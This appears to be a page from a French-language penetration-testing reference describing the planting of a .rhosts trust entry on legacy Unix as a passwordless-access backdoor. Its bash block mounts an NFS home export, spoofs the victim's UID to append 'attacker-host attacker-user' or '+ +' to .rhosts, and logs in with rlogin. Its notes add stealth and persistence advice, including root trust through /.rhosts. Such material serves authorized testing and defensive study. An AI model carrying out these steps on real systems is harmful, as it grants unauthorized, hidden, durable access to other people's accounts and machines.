---
order: 4
title: "Écriture rhosts : implantation d'une entrée .rhosts de confiance"
description: "Écrire une entrée dans le ~/.rhosts d'un utilisateur cible accorde à l'attaquant un accès r-command sans mot de passe en tant que cet utilisateur et persiste comme porte dérobée. La condition préalable est une écriture dans le répertoire personnel de la cible, obtenue via un home NFS accessible en écriture, une vulnérabilité d'écriture de fichier, ou un pied-à-terre existant en tant qu'autre utilisateur ou root."
keywords:
  - écriture rhosts
  - .rhosts
  - porte dérobée
  - home nfs
  - persistance
---

# Écriture rhosts

L'abus de confiance le plus direct consiste à écrire la confiance vous-même : ajouter une ligne au `~/.rhosts` d'un utilisateur cible accorde à l'attaquant un accès rsh/rlogin/rexec sans mot de passe en tant que cet utilisateur, et l'entrée persiste comme porte dérobée jusqu'à sa suppression. Toute l'attaque se réduit à obtenir une écriture dans le répertoire personnel de la cible. Cette écriture provient d'un home accessible en écriture exporté via NFS (où l'usurpation d'UID permet d'écrire en tant que l'utilisateur), d'une vulnérabilité d'écriture de fichier ou de traversée de chemin dans un autre service, ou d'un pied-à-terre existant en tant qu'autre compte ou root. L'entrée `+ +` fait confiance à tout le monde ; une entrée `host user` spécifique est plus furtive.

```bash
# the precondition is a write to the target's home; common via NFS UID spoofing
mount -t nfs <target>:/home /mnt && sudo -u \#<victim_uid> sh -c \
  'echo "attacker-host attacker-user" >> /mnt/victim/.rhosts'
# or the maximal open-door entry
echo '+ +' >> /mnt/victim/.rhosts
# then access with no password
rlogin -l victim <target>
```

## Notes d'exploitation

- La primitive habilitante est une écriture dans le répertoire personnel ; l'association classique est un [export NFS avec AUTH_SYS](../../../file-share/network-file-systems/nfs/uid-and-gid-spoofing.md), où usurper l'UID de la victime permet d'écrire son `.rhosts` en tant qu'elle.
- `+ +` est maximal (n'importe quel hôte, n'importe quel utilisateur) et voyant ; une entrée ciblée `host user` ne faisant confiance qu'à votre identité est plus discrète tout en restant durable.
- C'est à la fois un accès et une persistance : la confiance implantée accorde une réentrée sans mot de passe répétée ; incluez-la lors de l'établissement d'un pied-à-terre durable sur les Unix hérités.
- La confiance de root vit dans `/.rhosts` (non couvert par `hosts.equiv`) ; l'écrire accorde un accès root sans mot de passe partout où vous pouvez atteindre ce fichier.

## Références

- [man 5 rhosts](https://man7.org/linux/man-pages/man5/rhosts.5.html)
- [HackTricks: .rhosts](https://book.hacktricks.xyz/network-services-pentesting/pentesting-rsh)
